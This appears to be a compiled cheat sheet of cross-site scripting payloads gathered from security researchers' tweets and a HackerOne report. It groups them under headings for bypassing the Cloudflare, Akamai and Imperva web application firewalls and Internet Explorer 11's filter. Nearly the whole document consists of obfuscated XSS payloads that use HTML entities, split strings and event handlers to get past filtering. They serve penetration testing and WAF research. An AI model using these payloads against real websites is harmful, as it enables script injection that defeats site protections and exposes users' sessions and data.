# XSS Twitter Tips

## Cloudflare XSS Bypass

*[Tweet](https://twitter.com/aisecureme/status/1240354605520678913) By [AISECUREME](https://twitter.com/aisecureme)*

```html
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
```
----------------------------------------------------------------------------------------

*[Tweet](https://twitter.com/s0md3v/status/1100734547962998785) By [s0md3v](https://twitter.com/s0md3v)*
```html
<a"/onclick=(confirm)()>Click Here!
```

----------------------------------------------------------------------------

## Akamai XSS Bypass

*[Tweet](https://twitter.com/aisecureme/status/1240354605520678913) By [AISECUREME](https://twitter.com/aisecureme)*
```html
“><svg/on</script>laod=alert>
```

*[Tweet](https://twitter.com/saamux/status/1238449598051516418) By [saamux](https://twitter.com/saamux)*

A good way to bypass the Akamai WAF by exploiting a redirect-based XSS is with the following payload:

```javascript
javascript:new%20Function`al\ert\`1\``;
```
You can also obfuscate it using HTML entities

----------------------------------------------------------------------------

## WAF/filter Bypass
*[Tweet](https://twitter.com/si9int/status/1239633166438223874) By [si9int](https://twitter.com/si9int)*
![XSS](https://images-ext-1.discordapp.net/external/igR8oewSZci1zKzKoqk0xr9PunkJoDHTmGgLLi6FYfw/https/pbs.twimg.com/media/ETQPvU3WoAMiDBw.png%3Alarge)

----------------------------------------------------------------------------

## Imperva WAF Bypass

*[Tweet](https://twitter.com/ahmetumitbayram/status/1248372473533431809) By Ahmet Ümit BAYRAM([@ahmetumitbayram](https://twitter.com/ahmetumitbayram))* [10 Apr 2020]
```html
<details/open/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];">
```
`- without parentheses, 'alert', 'document.domain' , 'window' , space`

----------------------------------------------------------------------------

## IE Bypass
### IE 11 Xss Bypass 
*[Report #127259](https://hackerone.com/reports/127259) by [sergeym](https://hackerone.com/sergeym)*

```html
"</script><script/%00%00v%00%00>document.location.href=location.hash.slice(1)</script>#javascript:alert(document.domain)
